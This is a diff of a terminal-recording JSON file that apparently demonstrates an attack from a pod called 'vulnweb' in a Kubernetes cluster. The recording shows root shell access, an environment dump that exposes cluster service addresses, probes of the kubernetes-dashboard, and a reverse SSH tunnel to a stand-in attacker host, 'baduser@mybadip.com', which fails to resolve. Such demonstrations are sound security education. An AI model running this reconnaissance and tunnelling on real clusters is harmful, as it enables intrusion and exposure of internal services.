@@ -11,211 +11,11 @@
   },
   "stdout": [
     [
-      0.236779,
-      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
-    ],
-    [
-      0.437807,
-      "k"
-    ],
-    [
-      6.7e-05,
-      "ubec"
-    ],
-    [
-      3.9e-05,
-      "tl "
-    ],
-    [
-      0.000162,
-      "exe"
-    ],
-    [
-      4.7e-05,
-      "c -it"
-    ],
-    [
-      4e-05,
-      " v"
-    ],
-    [
-      4.1e-05,
-      "u"
-    ],
-    [
-      3.6e-05,
-      "ln"
-    ],
-    [
-      4.6e-05,
-      "we"
-    ],
-    [
-      3.4e-05,
-      "b"
-    ],
-    [
-      3.6e-05,
-      "-2"
-    ],
-    [
-      0.000117,
-      "5"
-    ],
-    [
-      4.6e-05,
-      "69941"
-    ],
-    [
-      4.2e-05,
-      "4"
-    ],
-    [
-      0.000122,
-      "0"
-    ],
-    [
-      5.4e-05,
-      "5-q8v9"
-    ],
-    [
-      4.6e-05,
-      "r "
-    ],
-    [
-      7.2e-05,
-      "/"
-    ],
-    [
-      5.8e-05,
-      "bi"
-    ],
-    [
-      4.2e-05,
-      "n/"
-    ],
-    [
-      4.9e-05,
-      "ba"
-    ],
-    [
-      4.3e-05,
-      "sh"
-    ],
-    [
-      0.174449,
-      "\r\n"
-    ],
-    [
-      0.819904,
-      "root@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      0.944189,
-      "\r                                                                                         \rroot@vulnweb-2569941405-q8v9r:/# e"
-    ],
-    [
-      0.178666,
-      "x"
-    ],
-    [
-      0.10142,
-      "p"
-    ],
-    [
-      0.600467,
-      "o"
-    ],
-    [
-      0.084171,
-      "r"
-    ],
-    [
-      0.146409,
-      "t"
-    ],
-    [
-      0.113447,
-      " "
-    ],
-    [
-      0.178913,
-      "T"
-    ],
-    [
-      0.203202,
-      "E"
-    ],
-    [
-      0.089394,
-      "R"
-    ],
-    [
-      0.158555,
-      "M"
-    ],
-    [
-      0.303048,
-      "="
-    ],
-    [
-      0.247185,
-      "x"
-    ],
-    [
-      0.195097,
-      "t"
-    ],
-    [
-      0.099622,
-      "e"
-    ],
-    [
-      0.089524,
-      "r"
-    ],
-    [
-      0.021978,
-      "m"
-    ],
-    [
-      0.155055,
-      "\r\nroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      0.554172,
-      "c"
-    ],
-    [
-      0.201274,
-      "l"
-    ],
-    [
-      0.046812,
-      "e"
-    ],
-    [
-      0.06906,
-      "a"
-    ],
-    [
-      0.056649,
-      "r"
-    ],
-    [
-      0.051309,
-      "\r\n"
-    ],
-    [
-      0.000433,
-      "\u001b[3;J\u001b[H\u001b[2J"
-    ],
-    [
       0.000109,
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      0.4,
       "e"
     ],
     [
@@ -227,20 +27,12 @@
       "v"
     ],
     [
-      0.14481,
+      2.0,
       "\r\nVULNWEB_SERVICE_HOST=100.64.100.28\r\nVULNWEB_PORT_8000_TCP_ADDR=100.64.100.28\r\nHOSTNAME=vulnweb-2569941405-q8v9r\r\nGPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF\r\nVULNWEB_PORT_8000_TCP=tcp://100.64.100.28:8000\r\nTERM=xterm\r\nKUBERNETES_PORT_443_TCP_PORT=443\r\nKUBERNETES_PORT=tcp://100.64.0.1:443\r\nVULNWEB_PORT_8000_TCP_PROTO=tcp\r\nVULNWEB_PORT=tcp://100.64.100.28:8000\r\nKUBERNETES_SERVICE_PORT=443\r\nKUBERNETES_SERVICE_HOST=100.64.0.1\r\nPYTHON_VERSION=2.7.13\r\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nVULNWEB_PORT_8000_TCP_PORT=8000\r\nPWD=/\r\nLANG=C.UTF-8\r\nVULNWEB_SERVICE_PORT=8000\r\nPYTHON_PIP_VERSION=9.0.1\r\nSHLVL=1\r\nHOME=/root\r\nKUBERNETES_PORT_443_TCP_PROTO=tcp\r\nKUBERNETES_SERVICE_PORT_HTTPS=443\r\nKUBERNETES_PORT_443_TCP_ADDR=100.64.0.1\r\nKUBERNETES_PORT_443_TCP=tcp://100.64.0.1:443\r\n_=/usr/bin/env\r\nroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
       0.757009,
-      "curl -sk http://kubern"
-    ],
-    [
-      0.000516,
-      "etes-dashboard.kube-syste"
-    ],
-    [
-      5.7e-05,
-      "m"
+      "curl -sk http://kubernetes-dashboard.kube-system"
     ],
     [
       2.0,
@@ -295,24 +87,16 @@
       "^C\r\n--- kubernetes-dashboard.kube-system.svc.cluster.local ping statistics ---\r\n2 packets transmitted, 0 received, 100% packet loss, time 1007ms\r\n\r\nroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      3.0,
       "ssh -R8000:100.66.61.239:80 baduser@mybadip.com"
     ],
     [
-      2.0,
+      3.0,
       "\r\n"
     ],
     [
       0.018949,
       "ssh: Could not resolve hostname mybadip.com: Name or service not known\r\r\nroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      2.0,
-      "exit\r\n"
-    ],
-    [
-      0.016638,
-      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
     ]
   ]
 }
